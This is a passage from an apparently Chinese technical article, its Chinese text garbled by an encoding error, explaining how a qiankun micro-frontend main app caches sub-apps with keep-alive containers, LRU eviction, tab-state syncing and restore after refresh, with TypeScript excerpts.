  <span class="hljs-attr">token</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>              <span class="hljs-comment">// ç”¨æˆ· token</span>
  <span class="hljs-attr">onLogin</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>               <span class="hljs-comment">// ç™»å½•å›è°ƒ</span>
  <span class="hljs-attr">message</span>: <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">MessagePlugin</span>     <span class="hljs-comment">// æ¶ˆæ¯æç¤ºç»„ä»¶</span>
  <span class="hljs-attr">notification</span>: <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NotificationPlugin</span>  <span class="hljs-comment">// é€šçŸ¥ç»„ä»¶</span>
  <span class="hljs-attr">getUserInfo</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">UserData</span>       <span class="hljs-comment">// è·å–ç”¨æˆ·ä¿¡æ¯</span>
  <span class="hljs-attr">usePermissionList</span>: <span class="hljs-built_in">string</span>[]      <span class="hljs-comment">// æƒé™åˆ—è¡¨</span>
  <span class="hljs-attr">getBtnCodeList</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">string</span>[]   <span class="hljs-comment">// æŒ‰é’®æƒé™åˆ—è¡¨</span>
  <span class="hljs-attr">fetchUserInfo</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>        <span class="hljs-comment">// åˆ·æ–°ç”¨æˆ·ä¿¡æ¯</span>
  <span class="hljs-attr">onRefreshPage</span>: <span class="hljs-function">(<span class="hljs-params">fn: () =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>  <span class="hljs-comment">// é¡µé¢åˆ·æ–°å›è°ƒ</span>
  <span class="hljs-attr">onLogOut</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>             <span class="hljs-comment">// ç™»å‡ºå›è°ƒ</span>
  <span class="hljs-attr">addTagView</span>: <span class="hljs-function">(<span class="hljs-params">path: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>  <span class="hljs-comment">// æ·»åŠ é¡µç­¾</span>
  <span class="hljs-attr">getDefaultPath</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>  <span class="hljs-comment">// è·å–é»˜è®¤è·¯å¾„</span>
}
</code></pre>
<h4 data-id="heading-34">3. å®¹å™¨ç®¡ç†</h4>
<p>æ¯ä¸ªå¾®åº”ç”¨ä½¿ç”¨ç‹¬ç«‹çš„ DOM å®¹å™¨ï¼Œé€šè¿‡å®¹å™¨æ˜¾ç¤º/éšè—å®ç°ä¿æ´»ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®¹å™¨å‘½åè§„åˆ™: subApp-{appName}</span>
<span class="hljs-keyword">const</span> containerId = <span class="hljs-string">`subApp-<span class="hljs-subst">${appName}</span>`</span>

<span class="hljs-comment">// å®¹å™¨æ ·å¼</span>
container.<span class="hljs-property">className</span> = <span class="hljs-string">'h-full w-full absolute inset-0'</span>
container.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>  <span class="hljs-comment">// åˆå§‹éšè—</span>
</code></pre>
<hr/>
<h3 data-id="heading-35">å­åº”ç”¨é¡µç­¾ç¼“å­˜å®ç°</h3>
<h4 data-id="heading-36">1. ç¼“å­˜æ¶æ„</h4>
<h5 data-id="heading-37">ç¼“å­˜æ•°æ®ç»“æ„</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">CachedMicroApp</span> = {
  <span class="hljs-attr">instance</span>: <span class="hljs-title class_">QiankunMicroApp</span>    <span class="hljs-comment">// qiankun å¾®åº”ç”¨å®ä¾‹</span>
  <span class="hljs-attr">containerId</span>: <span class="hljs-built_in">string</span>          <span class="hljs-comment">// DOM å®¹å™¨ ID</span>
  <span class="hljs-attr">lastActiveTime</span>: <span class="hljs-built_in">number</span>       <span class="hljs-comment">// æœ€åæ¿€æ´»æ—¶é—´ï¼ˆç”¨äº LRU æ¸…ç†ï¼‰</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-built_in">string</span>               <span class="hljs-comment">// å…¥å£åœ°å€</span>
}

<span class="hljs-comment">// ç¼“å­˜å­˜å‚¨</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">cachedMicroApps</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">CachedMicroApp</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()
</code></pre>
<h5 data-id="heading-38">ç¼“å­˜é…ç½®</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ˜¯å¦å¯ç”¨ä¿æ´»æ¨¡å¼ï¼ˆé»˜è®¤å¯ç”¨ï¼‰</span>
<span class="hljs-keyword">let</span> keepAliveEnabled = <span class="hljs-literal">true</span>

<span class="hljs-comment">// æœ€å¤§ç¼“å­˜æ•°é‡ï¼ˆè¶…è¿‡æ—¶æ¸…ç†æœ€æ—§çš„åº”ç”¨ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_CACHED_APPS</span> = <span class="hljs-number">5</span>
</code></pre>
<h4 data-id="heading-39">2. ç¼“å­˜ç”Ÿå‘½å‘¨æœŸ</h4>
<h5 data-id="heading-40">2.1 é¦–æ¬¡æŒ‚è½½ï¼ˆç¼“å­˜åˆ›å»ºï¼‰</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. æ£€æŸ¥ç¼“å­˜æ˜¯å¦å·²æ»¡ï¼Œæ¸…ç†æœ€æ—§çš„åº”ç”¨</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">cleanupOldestCachedApp</span>()

<span class="hljs-comment">// 2. éšè—æ‰€æœ‰å·²ç¼“å­˜çš„åº”ç”¨å®¹å™¨</span>
<span class="hljs-title function_">hideAllCachedContainers</span>()

<span class="hljs-comment">// 3. ä¸ºæ–°åº”ç”¨åˆ›å»ºç‹¬ç«‹å®¹å™¨</span>
<span class="hljs-keyword">const</span> appContainerId = <span class="hljs-title function_">createAppContainer</span>(name, mainContainerId)

<span class="hljs-comment">// 4. ä½¿ç”¨ loadMicroApp æŒ‚è½½</span>
<span class="hljs-keyword">const</span> microApp = <span class="hljs-title function_">loadMicroApp</span>({
  name,
  entry,
  <span class="hljs-attr">container</span>: <span class="hljs-string">`#<span class="hljs-subst">${appContainerId}</span>`</span>,
  <span class="hljs-attr">props</span>: mergedProps,
}, sandboxConfig)

<span class="hljs-comment">// 5. ç­‰å¾…æŒ‚è½½å®Œæˆ</span>
<span class="hljs-keyword">await</span> microApp.<span class="hljs-property">mountPromise</span>

<span class="hljs-comment">// 6. æ˜¾ç¤ºå®¹å™¨å¹¶åŠ å…¥ç¼“å­˜</span>
<span class="hljs-title function_">showAppContainer</span>(appContainerId)
cachedMicroApps.<span class="hljs-title function_">set</span>(name, {
  <span class="hljs-attr">instance</span>: microApp,
  <span class="hljs-attr">containerId</span>: appContainerId,
  <span class="hljs-attr">lastActiveTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
  entry,
})
</code></pre>
<h5 data-id="heading-41">2.2 ä»ç¼“å­˜æ¿€æ´»</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. æ£€æŸ¥ç¼“å­˜ä¸­æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-keyword">const</span> cached = cachedMicroApps.<span class="hljs-title function_">get</span>(name)

<span class="hljs-keyword">if</span> (cached) {
  <span class="hljs-comment">// 2. éšè—æ‰€æœ‰å…¶ä»–åº”ç”¨çš„å®¹å™¨</span>
  <span class="hljs-title function_">hideAllCachedContainers</span>()
  
  <span class="hljs-comment">// 3. æ˜¾ç¤ºç›®æ ‡åº”ç”¨çš„å®¹å™¨</span>
  <span class="hljs-title function_">showAppContainer</span>(cached.<span class="hljs-property">containerId</span>)
  
  <span class="hljs-comment">// 4. æ›´æ–°æ¿€æ´»æ—¶é—´</span>
  cached.<span class="hljs-property">lastActiveTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
  
  <span class="hljs-comment">// 5. æ›´æ–°å½“å‰åº”ç”¨ä¿¡æ¯</span>
  currentAppName = name
  currentMicroApp = cached.<span class="hljs-property">instance</span>
  
  <span class="hljs-comment">// 6. æ›´æ–° URL å¹¶è§¦å‘è·¯ç”±äº‹ä»¶</span>
  <span class="hljs-keyword">if</span> (path) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">pushState</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">''</span>, path)
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashChangeEvent</span>(<span class="hljs-string">'hashchange'</span>))
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PopStateEvent</span>(<span class="hljs-string">'popstate'</span>))
  }
  
  <span class="hljs-keyword">return</span> cached.<span class="hljs-property">instance</span>  <span class="hljs-comment">// ç›´æ¥è¿”å›ï¼Œæ— éœ€é‡æ–°æŒ‚è½½</span>
}
</code></pre>
<h5 data-id="heading-42">2.3 ç¼“å­˜æ¸…ç†ï¼ˆLRU ç­–ç•¥ï¼‰</h5>
<p>å½“ç¼“å­˜æ•°é‡è¶…è¿‡ <code>MAX_CACHED_APPS</code> æ—¶ï¼Œæ¸…ç†æœ€æ—§çš„éå½“å‰æ¿€æ´»åº”ç”¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">cleanupOldestCachedApp</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (cachedMicroApps.<span class="hljs-property">size</span> &lt; <span class="hljs-variable constant_">MAX_CACHED_APPS</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// æ‰¾åˆ°æœ€æ—§çš„éå½“å‰æ¿€æ´»çš„åº”ç”¨</span>
  <span class="hljs-keyword">let</span> <span class="hljs-attr">oldestName</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
  <span class="hljs-keyword">let</span> oldestTime = <span class="hljs-title class_">Infinity</span>

  cachedMicroApps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cached, name</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (name !== currentAppName &amp;&amp; cached.<span class="hljs-property">lastActiveTime</span> &lt; oldestTime) {
      oldestTime = cached.<span class="hljs-property">lastActiveTime</span>
      oldestName = name
    }
  })

  <span class="hljs-keyword">if</span> (oldestName) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">destroyCachedApp</span>(oldestName)
  }
}
</code></pre>
<h4 data-id="heading-43">3. é¡µç­¾çŠ¶æ€åŒæ­¥</h4>
<p>ä¸»åº”ç”¨é€šè¿‡ <strong>qiankun å…¨å±€çŠ¶æ€</strong>ï¼ˆ<code>initGlobalState</code>ï¼‰å‘å­åº”ç”¨åŒæ­¥é¡µç­¾ç¼“å­˜ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/layout/TagsView/index.tsx</span>

<span class="hljs-comment">// é€šçŸ¥å­åº”ç”¨ç¼“å­˜çš„å…¬å…±æ–¹æ³•</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">notifySubAppCache</span> = (<span class="hljs-params">tagsList: <span class="hljs-keyword">typeof</span> tagsViewList, triggerSource: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> stateTags = tagsList.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">path</span>) {
      <span class="hljs-keyword">return</span> (item.<span class="hljs-property">path</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>).<span class="hljs-title function_">pop</span>()
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">'*'</span>
  })
  
  <span class="hljs-comment">// ä½¿ç”¨ qiankun å…¨å±€çŠ¶æ€åŒæ­¥</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">action</span>: <span class="hljs-title class_">MicroAppStateActions</span> = <span class="hljs-title function_">initGlobalState</span>({ <span class="hljs-attr">cachedTags</span>: stateTags })
  action.<span class="hljs-title function_">setGlobalState</span>({ <span class="hljs-attr">cachedTags</span>: stateTags })
}
</code></pre>
<p><strong>è§¦å‘æ—¶æœº</strong>ï¼š</p>
<ul>
<li>æ–°å¢é¡µç­¾æ—¶</li>
<li>åˆ‡æ¢é¡µç­¾æ—¶</li>
<li>åˆ é™¤é¡µç­¾æ—¶</li>
<li>é¡µç­¾å·²å­˜åœ¨æ—¶ï¼ˆç¡®ä¿çŠ¶æ€åŒæ­¥ï¼‰</li>
</ul>
<p><strong>å­åº”ç”¨æ¥æ”¶</strong>ï¼ˆå­åº”ç”¨éœ€è¦å®ç°ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å­åº”ç”¨ä»£ç ç¤ºä¾‹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
  <span class="hljs-comment">// ç›‘å¬å…¨å±€çŠ¶æ€å˜åŒ–</span>
  props.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> { cachedTags } = state
    <span class="hljs-comment">// æ ¹æ® cachedTags æ›´æ–°å­åº”ç”¨çš„ keep-alive ç¼“å­˜</span>
    <span class="hljs-title function_">updateKeepAliveCache</span>(cachedTags)
  }, <span class="hljs-literal">true</span>)  <span class="hljs-comment">// fireImmediately = trueï¼Œç«‹å³è§¦å‘ä¸€æ¬¡</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-44">å­åº”ç”¨åˆ‡æ¢å®ç°</h3>
<h4 data-id="heading-45">1. åˆ‡æ¢æµç¨‹</h4>
<h5 data-id="heading-46">1.1 åŒåº”ç”¨å†…é¡µé¢åˆ‡æ¢</h5>
<p>å½“åˆ‡æ¢çš„é¡µç­¾å±äºåŒä¸€ä¸ªå¾®åº”ç”¨æ—¶ï¼Œåªéœ€æ›´æ–°è·¯ç”±ï¼Œæ— éœ€é‡æ–°æŒ‚è½½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/layout/TagsView/index.tsx</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeHandle</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">value: TabValue</span>) =&gt; {
  <span class="hljs-keyword">const</span> findItem = tagsViewList.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">id</span> == value)
  <span class="hljs-keyword">const</span> currentApp = <span class="hljs-title function_">getCurrentAppName</span>()
  
  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¾®åº”ç”¨å†…çš„é¡µé¢åˆ‡æ¢</span>
  <span class="hljs-keyword">if</span> (currentApp === findItem.<span class="hljs-property">mircoAppName</span>) {
    <span class="hljs-comment">// åŒä¸€ä¸ªå¾®åº”ç”¨å†…åˆ‡æ¢ï¼Œåªéœ€æ›´æ–°è·¯ç”±</span>
    <span class="hljs-title function_">navigate</span>(<span class="hljs-string">`<span class="hljs-subst">${findItem.activeRule}</span>/#<span class="hljs-subst">${findItem.path}</span>`</span>)
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'hashchange'</span>))
  }
}
</code></pre>
<h5 data-id="heading-47">1.2 ä¸åŒåº”ç”¨é—´åˆ‡æ¢</h5>
<p>å½“åˆ‡æ¢åˆ°ä¸åŒçš„å¾®åº”ç”¨æ—¶ï¼Œè§¦å‘æŒ‚è½½æµç¨‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (findItem.<span class="hljs-property">mircoAppName</span> &amp;&amp; findItem.<span class="hljs-property">entry</span>) {
  <span class="hljs-comment">// ä¸åŒå¾®åº”ç”¨ä¹‹é—´åˆ‡æ¢ï¼Œéœ€è¦æŒ‚è½½æ–°åº”ç”¨</span>
  <span class="hljs-title function_">initMicroApps</span>(mircoAppList)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">mountMicroApp</span>({
    <span class="hljs-attr">name</span>: findItem.<span class="hljs-property">mircoAppName</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>,
    <span class="hljs-attr">entry</span>: findItem.<span class="hljs-property">entry</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>,
    <span class="hljs-attr">path</span>: fullPath,
  })
}
</code></pre>
<p><strong>åˆ‡æ¢é€»è¾‘</strong>ï¼š</p>
<ol>
<li>å¦‚æœç›®æ ‡åº”ç”¨å·²åœ¨ç¼“å­˜ä¸­ â†’ ç›´æ¥æ¿€æ´»ï¼ˆæ˜¾ç¤ºå®¹å™¨ï¼‰</li>
<li>å¦‚æœç›®æ ‡åº”ç”¨ä¸åœ¨ç¼“å­˜ä¸­ â†’ åˆ›å»ºæ–°å®¹å™¨å¹¶æŒ‚è½½</li>
<li>å¦‚æœç¼“å­˜å·²æ»¡ â†’ æ¸…ç†æœ€æ—§çš„åº”ç”¨åå†æŒ‚è½½</li>
</ol>
<h4 data-id="heading-48">2. å¸è½½é€»è¾‘</h4>
<h5 data-id="heading-49">2.1 ä¿æ´»æ¨¡å¼ä¸‹çš„å¸è½½</h5>
<p>åœ¨ä¿æ´»æ¨¡å¼ä¸‹ï¼Œå¸è½½æ“ä½œå®é™…ä¸Šåªæ˜¯éšè—å®¹å™¨ï¼Œä¸çœŸæ­£é”€æ¯åº”ç”¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> unmountMicroApp = <span class="hljs-keyword">async</span> (force = <span class="hljs-literal">false</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
  <span class="hljs-comment">// ä¿æ´»æ¨¡å¼ä¸‹ï¼Œåªéšè—å®¹å™¨ï¼Œä¸çœŸæ­£å¸è½½</span>
  <span class="hljs-keyword">if</span> (keepAliveEnabled &amp;&amp; !force) {
    <span class="hljs-keyword">const</span> cached = cachedMicroApps.<span class="hljs-title function_">get</span>(currentAppName)
    <span class="hljs-keyword">if</span> (cached) {
      <span class="hljs-title function_">hideAppContainer</span>(cached.<span class="hljs-property">containerId</span>)  <span class="hljs-comment">// ä»…éšè—</span>
      currentMicroApp = <span class="hljs-literal">null</span>
      currentAppName = <span class="hljs-literal">null</span>
      <span class="hljs-keyword">return</span>  <span class="hljs-comment">// ä¸æ‰§è¡ŒçœŸæ­£çš„å¸è½½</span>
    }
  }
  
  <span class="hljs-comment">// éä¿æ´»æ¨¡å¼æˆ–å¼ºåˆ¶å¸è½½ï¼Œæ‰§è¡ŒçœŸæ­£çš„å¸è½½</span>
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h5 data-id="heading-50">2.2 å¼ºåˆ¶å¸è½½</h5>
<p>æŸäº›åœºæ™¯éœ€è¦çœŸæ­£é”€æ¯åº”ç”¨ï¼ˆå¦‚åˆ·æ–°ã€ç™»å‡ºï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¼ºåˆ¶å¸è½½æŒ‡å®šåº”ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> removeCachedApp = <span class="hljs-keyword">async</span> (<span class="hljs-attr">appName</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
  <span class="hljs-keyword">if</span> (cachedMicroApps.<span class="hljs-title function_">has</span>(appName)) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">destroyCachedApp</span>(appName)  <span class="hljs-comment">// çœŸæ­£é”€æ¯</span>
  }
}

<span class="hljs-comment">// æ¸…ç©ºæ‰€æœ‰ç¼“å­˜</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> clearAllCachedApps = <span class="hljs-keyword">async</span> (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
  <span class="hljs-keyword">const</span> appNames = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(cachedMicroApps.<span class="hljs-title function_">keys</span>())
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> appName <span class="hljs-keyword">of</span> appNames) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">destroyCachedApp</span>(appName)
  }
}
</code></pre>
<h4 data-id="heading-51">3. é¡µé¢åˆ·æ–°æ¢å¤</h4>
<p>é¡µé¢åˆ·æ–°åï¼Œæ ¹æ®å½“å‰è·¯ç”±è‡ªåŠ¨æ¢å¤å¾®åº”ç”¨æŒ‚è½½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/views/microApp/index.tsx</span>

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (mircoAppList &amp;&amp; mircoAppList.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; !mountedRef.<span class="hljs-property">current</span>) {
    <span class="hljs-comment">// åˆå§‹åŒ–å¾®åº”ç”¨é…ç½®</span>
    <span class="hljs-title function_">initMicroApps</span>(mircoAppList)
    
    <span class="hljs-comment">// æ ¹æ®å½“å‰è·¯ç”±æŒ‚è½½å¾®åº”ç”¨</span>
    <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-keyword">const</span> mounted = <span class="hljs-keyword">await</span> <span class="hljs-title function_">remountByCurrentRoute</span>()
      <span class="hljs-keyword">if</span> (mounted) {
        mountedRef.<span class="hljs-property">current</span> = <span class="hljs-literal">true</span>
      }
    }, <span class="hljs-number">100</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer)
  }
}, [mircoAppList])
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/registerApp.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> remountByCurrentRoute = <span class="hljs-keyword">async</span> (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; =&gt; {
  <span class="hljs-keyword">const</span> currentPathname = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>
  <span class="hljs-keyword">const</span> currentHash = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>
  <span class="hljs-keyword">const</span> fullPath = currentPathname + currentHash
  
  <span class="hljs-comment">// æŸ¥æ‰¾åŒ¹é…å½“å‰è·¯ç”±çš„å¾®åº”ç”¨é…ç½®</span>
  <span class="hljs-keyword">const</span> matchedConfig = <span class="hljs-title function_">findMicroAppByPath</span>(currentPathname)
  
  <span class="hljs-keyword">if</span> (!matchedConfig) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  }
  
  <span class="hljs-comment">// æŒ‚è½½å¾®åº”ç”¨</span>
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title function_">mountMicroApp</span>({
    <span class="hljs-attr">name</span>: matchedConfig.<span class="hljs-property">name</span>,
    <span class="hljs-attr">entry</span>: matchedConfig.<span class="hljs-property">entry</span>,
    <span class="hljs-attr">container</span>: matchedConfig.<span class="hljs-property">container</span>,
    <span class="hljs-attr">path</span>: fullPath,
  })
  
  <span class="hljs-keyword">return</span> app !== <span class="hljs-literal">null</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-52">æ ¸å¿ƒä»£ç è§£æ</h3>
<h4 data-id="heading-53">1. å¾®åº”ç”¨åˆå§‹åŒ–</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/registerApp.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">initMicroApps</span> = (<span class="hljs-params">appData: <span class="hljs-built_in">any</span>[], permissionList = [<span class="hljs-string">'*'</span>]</span>) =&gt; {
  <span class="hljs-keyword">if</span> (!appData || !appData.<span class="hljs-property">length</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'æ²¡æœ‰å¯ç”¨çš„å¾®åº”ç”¨æ•°æ®'</span>)
    <span class="hljs-keyword">return</span>
  }

  globalPermissionList = permissionList

  <span class="hljs-comment">// è½¬æ¢åº”ç”¨æ•°æ®å¹¶ç¼“å­˜é…ç½®</span>
  <span class="hljs-keyword">const</span> flatData = <span class="hljs-title function_">flattenData</span>(appData)
  <span class="hljs-keyword">const</span> configs = <span class="hljs-title function_">transformData</span>(flatData, permissionList)

  <span class="hljs-comment">// å­˜å‚¨åˆ°é…ç½®æ˜ å°„è¡¨</span>
  configs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    microAppConfigMap.<span class="hljs-title function_">set</span>(config.<span class="hljs-property">name</span>, config)
  })

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¾®åº”ç”¨é…ç½®å·²åˆå§‹åŒ–:'</span>, <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(microAppConfigMap.<span class="hljs-title function_">keys</span>()))
}
</code></pre>
<h4 data-id="heading-54">2. æŒ‚è½½æ ¸å¿ƒé€»è¾‘</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> mountMicroApp = <span class="hljs-keyword">async</span> (<span class="hljs-attr">params</span>: <span class="hljs-title class_">MountMicroAppParams</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">QiankunMicroApp</span> | <span class="hljs-literal">null</span>&gt; =&gt; {
  <span class="hljs-keyword">const</span> { name, entry, container = <span class="hljs-string">'#subApp'</span>, path, defaultPath, <span class="hljs-attr">props</span>: extraProps } = params
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-title function_">loader</span>(<span class="hljs-literal">true</span>)
    
    <span class="hljs-comment">// ç¡®ä¿å®¹å™¨å­˜åœ¨</span>
    <span class="hljs-keyword">const</span> mainContainerId = <span class="hljs-title function_">getContainerId</span>(container)
    <span class="hljs-keyword">const</span> containerReady = <span class="hljs-keyword">await</span> <span class="hljs-title function_">waitForContainer</span>(mainContainerId)
    <span class="hljs-keyword">if</span> (!containerReady) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`å®¹å™¨ #<span class="hljs-subst">${mainContainerId}</span> ä¸å­˜åœ¨æˆ–æ— æ³•åˆ›å»º`</span>)
    }

    <span class="hljs-comment">// ==================== ä¿æ´»æ¨¡å¼é€»è¾‘ ====================</span>
    <span class="hljs-keyword">if</span> (keepAliveEnabled) {
      <span class="hljs-comment">// æ£€æŸ¥ç¼“å­˜</span>
      <span class="hljs-keyword">const</span> cached = cachedMicroApps.<span class="hljs-title function_">get</span>(name)
      
      <span class="hljs-keyword">if</span> (cached) {
        <span class="hljs-comment">// ä»ç¼“å­˜æ¿€æ´»</span>
        <span class="hljs-title function_">hideAllCachedContainers</span>()
        <span class="hljs-title function_">showAppContainer</span>(cached.<span class="hljs-property">containerId</span>)
        cached.<span class="hljs-property">lastActiveTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
        currentAppName = name
        currentMicroApp = cached.<span class="hljs-property">instance</span>
        
        <span class="hljs-keyword">if</span> (path) {
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">pushState</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">''</span>, path)
          <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashChangeEvent</span>(<span class="hljs-string">'hashchange'</span>))
        }
        
        <span class="hljs-title function_">loader</span>(<span class="hljs-literal">false</span>)
        <span class="hljs-keyword">return</span> cached.<span class="hljs-property">instance</span>
      }
      
      <span class="hljs-comment">// æ–°å»ºå¹¶ç¼“å­˜</span>
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">cleanupOldestCachedApp</span>()
      <span class="hljs-title function_">hideAllCachedContainers</span>()
      <span class="hljs-keyword">const</span> appContainerId = <span class="hljs-title function_">createAppContainer</span>(name, mainContainerId)
      
      <span class="hljs-keyword">const</span> microApp = <span class="hljs-title function_">loadMicroApp</span>({
        name,
        entry,
